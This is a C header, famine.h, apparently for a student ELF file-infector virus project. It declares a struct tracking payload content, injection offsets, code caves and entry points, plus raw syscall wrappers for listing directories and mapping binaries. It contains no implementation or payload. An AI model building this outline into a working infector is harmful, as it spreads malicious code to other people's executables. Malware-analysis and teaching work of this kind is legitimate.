#ifndef FAMINE_H

#define FAMINE_H

# include <unistd.h>
# include <stdlib.h>
# include <stdio.h>
# include <string.h>
# include <fcntl.h>
# include <sys/mman.h>
# include <sys/types.h>
# include <elf.h>
# include <sys/stat.h>

# include <sys/syscall.h> 

#define DEBUG 1

typedef struct s_env {
	
	void 			*obj;
	char			*obj_name;
	size_t			obj_name_size;
	void 			*obj_cpy;
	char 			*payload_file;
	unsigned int	*payload_content;
	size_t			payload_size;
	size_t			load_align;
	unsigned int	obj_size;
	unsigned int	new_obj_size;
	unsigned int	obj_base;
	unsigned int	inject_offset;
	unsigned int	inject_addr;
	unsigned int	plt_offset;
	unsigned int 	entrypoint;
	int				found_code_cave;
	int				found_code_cave_id;
	u_int8_t		cpu;
}				t_env;

struct dirent {
    ino_t          d_ino;       /* inode number */
    off_t          d_off;       /* offset to the next dirent */
    unsigned short d_reclen;    /* length of this record */
    char           d_name[]; /* filename */
};

extern char __executable_start;
extern char _end;

int main(void);
int read_obj(t_env *env);
int dump_obj(t_env *env);
int check_corruption(void *obj, size_t size, char *obj_name);
void debug_dump(t_env *env, unsigned int *content, unsigned int start_addr, size_t size);

size_t ft_strlen(const char *s);
void ft_bzero(void *s, size_t n);
int	ft_strcmp(const char *s1, const char *s2);
char *ft_strcpy(char *dest, const char *src);
char *ft_strcat(char *dest, const char *src);
void *ft_memmove(void *dest, const void *src, size_t n);
void *ft_memset(void *s, int c, size_t n);

int syscall_write(unsigned fd, const char *buf, unsigned count);
int syscall_open_2(const char *pathname, int flags);
int syscall_open_3(const char *pathname, int flags, mode_t mode);
int syscall_openat(int dirfd, const char *pathname, int flags);
int syscall_getdents(unsigned fd, char *buf, unsigned count);
int syscall_fstat(int fd, struct stat *buf);
__uid_t syscall_getuid();
__gid_t syscall_getgid();
void *syscall_mmap(unsigned long addr, unsigned long len, unsigned long prot, unsigned long flags, unsigned long fd, unsigned long off);
int syscall_munmap(void *addr, size_t len);
void syscall_close(unsigned int fd);

#endif